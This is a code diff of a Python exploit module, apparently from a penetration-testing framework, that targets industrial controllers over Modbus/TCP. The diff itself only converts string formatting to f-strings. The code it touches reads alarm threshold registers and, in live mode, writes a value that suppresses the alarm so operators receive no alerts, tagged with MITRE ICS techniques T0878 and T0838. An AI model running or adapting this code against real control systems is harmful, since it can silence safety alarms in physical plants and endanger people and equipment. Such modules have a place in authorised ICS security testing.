@@ -86,7 +86,7 @@ class Exploit(Exploit):
 
         if self.simulate:
             # Read current threshold value
-            print_status("[T0878] Reading alarm threshold register {} (simulate)…".format(self.address))
+            print_status(f"[T0878] Reading alarm threshold register {self.address} (simulate)…")
             try:
                 pdu = struct.pack(">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x03, self.address, 3)
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -97,28 +97,22 @@ class Exploit(Exploit):
                 sock.close()
                 if len(resp) >= 11 and resp[7] == 0x03:
                     vals = [struct.unpack(">H", resp[9+i*2:11+i*2])[0] for i in range(3)]
-                    print_success("[T0878] Alarm threshold registers {}-{}: {}".format(
-                        self.address, self.address+2, vals))
-                    print_warning("[T0878] In destructive mode: would write {} to suppress alarm.".format(
-                        self.suppress_value))
+                    print_success(f"[T0878] Alarm threshold registers {self.address}-{self.address+2}: {vals}")
+                    print_warning(f"[T0878] In destructive mode: would write {self.suppress_value} to suppress alarm.")
             except Exception as exc:
-                print_error("[T0878] Read error: {}".format(exc))
+                print_error(f"[T0878] Read error: {exc}")
 
             DestructiveGate.print_simulation(
                 description=(
-                    "T0878: Would write {} to alarm threshold register {} on {}:{}. "
-                    "This disables the alarm — operators cannot receive alerts.".format(
-                        self.suppress_value, self.address, self.target, self.port
-                    )
+                    f"T0878: Would write {self.suppress_value} to alarm threshold register {self.address} on {self.target}:{self.port}. "
+                    "This disables the alarm — operators cannot receive alerts."
                 ),
-                payload_hex="00 01 00 00 00 06 {:02X} 06 {:04X} {:04X}".format(
-                    self.unit_id, self.address, self.suppress_value
-                ),
+                payload_hex=f"00 01 00 00 00 06 {self.unit_id:02X} 06 {self.address:04X} {self.suppress_value:04X}",
                 mitre_techniques=["T0878", "T0838"],
             )
             return
 
-        print_status("[T0878 LIVE] Writing alarm suppression to register {}…".format(self.address))
+        print_status(f"[T0878 LIVE] Writing alarm suppression to register {self.address}…")
         try:
             pdu = struct.pack(
                 ">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x06, self.address, self.suppress_value
@@ -130,9 +124,8 @@ class Exploit(Exploit):
             resp = sock.recv(32)
             sock.close()
             if resp and resp[7] == 0x06:
-                print_success("[T0878] Alarm threshold register {} set to {}. Alarm suppressed.".format(
-                    self.address, self.suppress_value))
+                print_success(f"[T0878] Alarm threshold register {self.address} set to {self.suppress_value}. Alarm suppressed.")
             else:
                 print_error("[T0878] Unexpected response.")
         except Exception as exc:
-            print_error("[T0878] Error: {}".format(exc))
+            print_error(f"[T0878] Error: {exc}")
